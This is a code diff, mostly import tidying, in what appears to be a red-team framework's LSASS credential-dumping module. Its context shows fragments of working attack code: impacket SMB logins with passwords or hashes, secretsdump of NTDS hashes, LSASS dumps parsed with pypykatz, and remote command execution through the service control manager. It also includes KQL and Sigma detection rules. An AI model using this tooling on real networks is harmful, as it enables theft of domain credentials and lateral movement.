@@ -21,20 +21,17 @@ OPSEC: HIGH - EDR monitors OpenProcess to LSASS (Sysmon Event ID 10).
 from __future__ import annotations
 
 import asyncio
-import base64
 import os
-import tempfile
 from typing import Any
 
-from ares.core.campaign import Finding, Severity, NoiseProfile
+from ares.core.campaign import NoiseProfile, Severity
 from ares.core.logger import audit, get_logger
 from ares.core.security import sanitize_hostname
+from ares.core.tracing import trace_module
 from ares.modules.base import BaseModule, OpsecLevel
 from ares.modules.params import LsassDumpParams
-from ares.core.tracing import trace_module
 from ares.sdk import (
     EvidenceRecord,
-    ExecutionContext,
     LockoutCircuitBreaker,
     ModuleResult,
     NetworkPermission,
@@ -90,8 +87,8 @@ class LsassDumpModule(BaseModule):
         Sysmon Event ID 10 / EDR process access hooks, and noise profile constraints.
         Recommends stealthier alternatives (windows.dpapi, windows.token_impersonation, ad.kerberoast).
         """
-        from ares.modules.base import FeasibilityReport
         from ares.core.campaign import NoiseProfile
+        from ares.modules.base import FeasibilityReport
 
         blockers: list[str] = []
         recommendations: list[str] = []
@@ -283,13 +280,13 @@ class LsassDumpModule(BaseModule):
         # Closed-Loop Purple Telemetry: KQL & Sigma rule synthesis
         dump_target = target or "TargetHost"
         kql_query = (
-            f"// ARES Closed-Loop Telemetry: Detect LSASS Process Memory Dumping\n"
-            f"// Detects Sysmon Event 10 (ProcessAccess targeting lsass.exe with PROCESS_VM_READ)\n"
-            f"SysmonEvent\n"
-            f"| where EventID == 10\n"
-            f"| where TargetImage endswith \"\\\\lsass.exe\"\n"
-            f"| where GrantedAccess in (\"0x1FFFFF\", \"0x1010\", \"0x1410\", \"0x0010\")\n"
-            f"| project TimeGenerated, Computer, SourceImage, TargetImage, GrantedAccess, CallTrace\n"
+            "// ARES Closed-Loop Telemetry: Detect LSASS Process Memory Dumping\n"
+            "// Detects Sysmon Event 10 (ProcessAccess targeting lsass.exe with PROCESS_VM_READ)\n"
+            "SysmonEvent\n"
+            "| where EventID == 10\n"
+            "| where TargetImage endswith \"\\\\lsass.exe\"\n"
+            "| where GrantedAccess in (\"0x1FFFFF\", \"0x1010\", \"0x1410\", \"0x0010\")\n"
+            "| project TimeGenerated, Computer, SourceImage, TargetImage, GrantedAccess, CallTrace\n"
         )
         sigma_rule = (
             f"title: LSASS Memory Dumping Activity ({dump_target})\n"
@@ -484,12 +481,15 @@ class LsassDumpModule(BaseModule):
             "details": {},
         }
         try:
-            from impacket.smbconnection import SMBConnection
-            from impacket.dcerpc.v5 import transport, rrp
+            from impacket.dcerpc.v5 import rrp, transport
             from impacket.dcerpc.v5.rrp import (
-                hOpenLocalMachine, hBaseRegOpenKey, hBaseRegQueryValue,
-                hBaseRegCloseKey, DCERPCException,
+                DCERPCException,
+                hBaseRegCloseKey,
+                hBaseRegOpenKey,
+                hBaseRegQueryValue,
+                hOpenLocalMachine,
             )
+            from impacket.smbconnection import SMBConnection
 
             smb = SMBConnection(target, target, timeout=10)
             smb.login(username, password, domain, lmhash, nthash)
@@ -559,7 +559,7 @@ class LsassDumpModule(BaseModule):
     def _secretsdump_sync(self, target: str, username: str, password: str,
                            domain: str, lmhash: str, nthash: str) -> list[dict]:
         """Direct secretsdump via impacket - no touch disk, DA required."""
-        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
+        from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
         from impacket.smbconnection import SMBConnection
 
         smb = SMBConnection(target, target, timeout=30)
@@ -613,10 +613,9 @@ class LsassDumpModule(BaseModule):
         4. Parse with pypykatz
         5. Secure-delete dump
         """
-        import io
         import uuid as _uuid
+
         from impacket.smbconnection import SMBConnection
-        from impacket.dcerpc.v5 import transport, scmr
 
         dump_id   = _uuid.uuid4().hex[:8].upper()
         dump_name = f"ARES{dump_id}.dmp"
@@ -712,9 +711,10 @@ class LsassDumpModule(BaseModule):
         out_file = None
         cleaned_up = False
         try:
+            import io
+            import uuid as _uuid
+
             from impacket.smbconnection import SMBConnection
-            from impacket.dcerpc.v5 import transport, scmr
-            import io, uuid as _uuid
 
             id_     = _uuid.uuid4().hex[:6]
             out_file = f"ARESPID{id_}.txt"
@@ -771,7 +771,7 @@ class LsassDumpModule(BaseModule):
                          cmd: str, svc_suffix: str) -> None:
         """Execute command via remote SCM service."""
         try:
-            from impacket.dcerpc.v5 import transport, scmr
+            from impacket.dcerpc.v5 import scmr, transport
 
             rpct = transport.DCERPCTransportFactory(f"ncacn_np:{target}[\\pipe\\svcctl]")
             rpct.set_credentials(username, password, domain, lmhash, nthash)
